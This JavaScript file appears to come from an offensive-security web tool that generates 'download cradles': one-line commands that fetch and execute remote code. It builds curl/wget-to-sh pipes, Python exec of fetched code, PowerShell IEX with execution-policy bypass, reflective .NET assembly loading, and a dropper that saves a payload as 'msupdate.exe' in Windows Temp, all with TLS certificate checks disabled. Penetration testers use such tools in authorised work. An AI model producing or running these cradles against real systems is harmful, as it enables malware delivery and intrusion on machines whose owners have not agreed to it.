// Cradle-wizard.js
// Author: @m8sec
// Copyright BreachTactics (C) 2024

function escapeSpecial(input) {
    // Add "`$" to escape variables in PS1
    return input.replace(/\$/g, '`$');
}

// Init clipboard
document.addEventListener('DOMContentLoaded', function() {
  new ClipboardJS('.btn', {
    text: function(trigger) {
      const targetId = trigger.getAttribute('data-clipboard-target');
      const element = document.querySelector(targetId);
      return element.innerText.trim();
    }
  });
});

// Event handler for Input Form
document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('cradleForm');
  form.addEventListener('submit', function(event) {
      event.preventDefault();

      // Get form values
      const url = document.getElementById('path').value;
      const useragent = document.getElementById('useragent')?.value || '';
      const headers = document.getElementById('header')?.value || '';
      const cmd = document.getElementById('cmd')?.value || '';
      const escape = document.getElementById('escape')?.checked || false;

      // Combine useragent + headers into dictionary object
      const hDict = {};
      if (useragent) {
        hDict['User-Agent'] = useragent;
      }
      if (headers) {
        headers.split(';').forEach(header => {
          const [key, value] = header.split(':').map(item => item.trim());
          if (key && value) {
            hDict[key] = value;
          }
        });
      }

      // Proxy option
      const proxyOptions = document.getElementsByName('proxy');
      let selectedProxy;
      for (let option of proxyOptions) {
          if (option.checked) {
              selectedProxy = option.value;
          }
      }

      let bashProxy = '';
      let ps1Proxy = '';
      let pyProxy = '';
      switch (selectedProxy) {
          case 'system':
              ps1Proxy = `$c.Proxy=[System.Net.WebRequest]::GetSystemWebProxy()`;
              bashProxy = '$http_proxy';
              pyProxy = 'x.getproxies()';
              break;
          case 'null':
              ps1Proxy = `$c.Proxy=$null`;
              break;
          case 'manual':
              const otherProxy = document.getElementById('otherProxy').value;
              ps1Proxy = `$c.Proxy=New-Object System.Net.WebProxy('${otherProxy}')`;
              bashProxy = `"${otherProxy}"`;
              pyProxy = `{"http":"${otherProxy}","https":"${otherProxy}"}`;
              break;
      }

      // CURL Bash
      var curlCradle = [
        `curl -s`,
        url.startsWith('https://') ? `k` : ``,
        `L `,
        useragent ? `-A "${useragent}" ` : ``,
        bashProxy ? `--proxy ${bashProxy} ` : ``,
        headers ? headers.split(';').map(header => `-H "${header}"`).join(' ') : ``,
        ` ${url} | sh`
       ].filter(Boolean).join('');

      // Wget Bash
      var wgetCradle = [
        `wget -qO-`,
        url.startsWith('https://') ? `--no-check-certificate` : ``,
        useragent ? `--user-agent="${useragent}"` : ``,
        bashProxy ? `-e use_proxy=yes -e http_proxy=${bashProxy}` : ``,
        headers ? headers.split(';').map(header => `--header="${header}"`).join(' ') : ``,
        `${url}`,
        `| sh`
      ].filter(Boolean).join(' ');

      // PYTHON - Standard Libraries Py
      var pyCradle = [
        `python3 -c 'import urllib.request as x`,
        url.startsWith('https://') ? `, ssl; ` : `; `,
        pyProxy ? `x.install_opener(x.build_opener(x.ProxyHandler(${pyProxy}))); ` : ``,
        `exec(x.urlopen(x.Request("${url}"`,
        url.startsWith('https://') ? `, context=ssl.create_unverified_context()` : ``,
        Object.keys(hDict).length > 0 ? `, headers={${Object.entries(hDict).map(([key, value]) => `"${key.trim()}":"${value.trim()}"`).join(', ')}}` : ``,
        `)).read());'`
      ].filter(Boolean).join('');

      // PYTHON - Requests library Py
      var pyReqCradle = [
        `python3 -c 'import requests`,
        selectedProxy == `system` ? `, urllib.request as x; ` : `; `,
        `exec(requests.get("${url}"`,
        url.startsWith('https://') ? `, verify=False` : ``,
        Object.keys(hDict).length > 0 ? `, headers={${Object.entries(hDict).map(([key, value]) => `"${key.trim()}":"${value.trim()}"`).join(', ')}}` : ``,
        pyProxy ? `, proxies=${pyProxy}` : ``,
        `).text);'`
      ].filter(Boolean).join('');

      // POWERSHELL - DownloadString Ps1
      var Ps1DownloadString = [
        `powershell.exe -exec bypass -c "`,
        url.startsWith('https://') ? `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; ` : ``,
        url.startsWith('https://') ? `[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; ` : ``,
        `$c=New-Object System.Net.WebClient; `,
        Object.keys(hDict).length > 0 ? `${Object.entries(hDict).map(([key, value]) => `$c.Headers.add('${key.trim()}','${value.trim()}'); `).join('')}` : ``,
        ps1Proxy ? `${ps1Proxy}; ` : ``,
        `IEX $c.DownloadString('${url}');${cmd}"`
      ].filter(Boolean).join('');

      // POWERSHELL - DownloadFile Exe
      var Ps1DownloadFile = [
        `powershell.exe -exec bypass -c "`,
        url.startsWith('https://') ? `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; ` : ``,
        url.startsWith('https://') ? `[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; ` : ``,
        `$c=New-Object System.Net.WebClient; `,
        Object.keys(hDict).length > 0 ? `${Object.entries(hDict).map(([key, value]) => `$c.Headers.add('${key.trim()}','${value.trim()}'); `).join('')}` : ``,
        ps1Proxy ? `${ps1Proxy}; ` : ``,
        `$c.DownloadFile('${url}', 'C:\\Windows\\Temp\\msupdate.exe'); C:\\Windows\\Temp\\msupdate.exe;"`
      ].filter(Boolean).join('');

      // POWERSHELL - DownloadData .Net Assembly
      var Ps1DownloadData = [
        `powershell.exe -exec bypass -c "`,
        url.startsWith('https://') ? `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; ` : ``,
        url.startsWith('https://') ? `[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; ` : ``,
        `$c=New-Object System.Net.WebClient; `,
        Object.keys(hDict).length > 0 ? `${Object.entries(hDict).map(([key, value]) => `$c.Headers.add('${key.trim()}','${value.trim()}'); `).join('')}` : ``,
        ps1Proxy ? `${ps1Proxy}; ` : ``,
        `[System.Reflection.Assembly]::Load($c.DownloadData('${url}')).EntryPoint.Invoke(0,@(,[string[]]@('${cmd}'.split())));"`
      ].filter(Boolean).join('');

      // PS1 Escape Special Chars
      if (escape) {
        Ps1DownloadString = escapeSpecial(Ps1DownloadString);
        Ps1DownloadFile = escapeSpecial(Ps1DownloadFile);
        Ps1DownloadData = escapeSpecial(Ps1DownloadData);
      }

      // Write output
      document.getElementById('curlCradle').innerText = curlCradle;
      document.getElementById('wgetCradle').innerText = wgetCradle;
      document.getElementById('pyCradle').innerText = pyCradle;
      document.getElementById('pyReqCradle').innerText = pyReqCradle;
      document.getElementById('Ps1DownloadString').innerText = Ps1DownloadString;
      document.getElementById('Ps1DownloadFile').innerText = Ps1DownloadFile;
      document.getElementById('Ps1DownloadData').innerText = Ps1DownloadData;
  });
});
